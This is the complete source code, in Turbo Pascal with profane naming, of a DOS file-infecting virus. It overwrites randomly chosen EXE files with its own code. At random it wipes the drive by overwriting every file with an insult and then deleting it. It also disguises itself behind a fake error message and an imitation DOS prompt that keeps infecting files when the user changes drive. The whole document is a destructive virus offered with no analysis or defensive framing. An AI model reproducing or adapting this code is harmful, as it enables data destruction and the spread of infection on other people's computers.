Program Orgasm;

{$I-} 

Uses Dos;

Type String1 = string[1];

{*****************************************}

Const CockSize = 6000; 

{*****************************************}

Var ThisFile, FuckedFile : File;      
    ThisDir              : String;
    ThisDrive            : Char;
    Level                : Byte;

Procedure Attach( Filename:String);   

Var Inread, Outwrite : Byte;
    Orgas            :Integer;
    Notice           :String;
    Myname           :String[60];

Begin
     Myname:=Paramstr(0);
     assign (ThisFile,MyName);
     Assign (FuckedFile,FileName);
     Reset (ThisFile,1);
     ReSet (FuckedFile,1);
     If cocksize>Sizeof(FuckedFile) then 
       Begin
          For Orgas:=1 to Cocksize do 
            begin
                BlockRead(ThisFile,Inread,Sizeof(Inread));
                BlockWrite(FuckedFile,InRead,Sizeof(InRead));
             end;  {Orgasim}
       end; {Cocksize test}
     Close (FuckedFile);
     close (ThisFile);
                            
end; {attach shit}

Procedure Cum(path : String); {Fuck over the 'puter}

Var Path2    : String;
    FileInfo : Searchrec;
    I        : Byte;
    F        : File;
    ST       : String;

begin          
ST:='YOU ARE FUCKED UP ASSHOLE';
Level:=Level+1;
FindFirst(path+'\*.*',Directory,Fileinfo);
While DosError = 0 do       
  Begin
     If (FileInfo.Attr = Directory) and (FileInfo.Name[1] <> '.') then 
       begin
          path2:=path+'\'+fileinfo.name;
          Cum(path2);
       end;
     If FileInfo.Attr <> Directory then
       Begin
          Assign(F,FileInfo.Name);
          Rewrite(F,1);
          BlockWrite(F,st,Sizeof(ST));
          Close(F);
          Erase(F);
       end;
     FindNext(FileInfo);
  end;

end; {CUM}

Procedure FileToAttach;  

Var
   Fileinfo : SearchRec;
   Path     : Array [1..20] of String[30];
   Name     : Array [1..200] of String[30];
   err      : Integer;
   nump     : Integer;
   Drand, Frand : word;
   Pather, Namer,y  : String[30];
   x        :Integer;
   z        :Byte;

label Mistake;

Begin
     Nump:=0;
     FindFirst('\*.*', Directory, Fileinfo);
     Err:=DosError;
     While Err=0 do
       begin
          If (Fileinfo.Attr = Directory) and (Fileinfo.NAME[1] <> '.') then 
            begin
               If Fileinfo.Name=Path[Nump] then Err:=1;
               Nump:=Nump+1;
               Path[Nump]:=Fileinfo.name;
            Mistake:end;
          FindNext(Fileinfo);
       end;

{Randomly Pick the Directory}

     Randomize;
     Drand:=(Random(NUMP-1))+1;
     Pather:=Path[Drand];
     Pather:='\'+Pather+'\';


{Find some EXE Philez}

     Nump:=0;
     Findfirst (Pather + '*.exe', Anyfile, Fileinfo);
     Err:=DosError;
     While Err = 0 do
       begin
{If Fileinfo.Name=Name[Nump] then Err:=2;}
         Nump:=Nump+1;
         Name[Nump]:=Fileinfo.name;
         FindNext(Fileinfo);
         If Fileinfo.name=Name[Nump] then Err:=2;
       end;

{Pick the EXE file!!!}
         Frand:=Random(Nump-1)+1;
         Namer:=Name[Frand];

{Tell me}
         If Nump<1 then Exit;
         Y:=Pather+Namer;
         Attach (Y);
         X:=Random(1000);
         
         GetDir(0,ThisDir);
         ThisDrive:=ThisDir[1];

         If X=666 then cum(ThisDrive+':');


end; {FiletoAttach}


Procedure FakeDos(Odrive : Char); 

Label 1;
var
  Ndrive : Char;

  Command: string[127];
  Prompt : String;
  
begin {FakeDos}
  Getdir(0,prompt);
  Odrive:=Prompt[1];
  repeat
       Getdir(0,prompt);
       Ndrive:=Prompt[1];
       If Odrive<>Ndrive then
         Begin
            Odrive:=Ndrive;
            FileToAttach;
         end;
       1:Write(Prompt + '>');
       ReadLn(Command);
       if Command = '' then goto 1;
         begin
            SwapVectors;
            Exec(GetEnv('COMSPEC'), '/C ' + Command);
            SwapVectors;
            Writeln;
            if DosError <> 0 then
            WriteLn('Could not execute COMMAND.COM');
         end;
until 1 = 2;

end; {FakeDos}






Begin
FileToAttach;
Writeln ('Cannot execute ',FExpand(ParamStr(0)));  {DOS 5.0 command}
Writeln;
GetDir(0,ThisDir);
ThisDrive:=ThisDir[1];
Fakedos(thisdrive);
end.
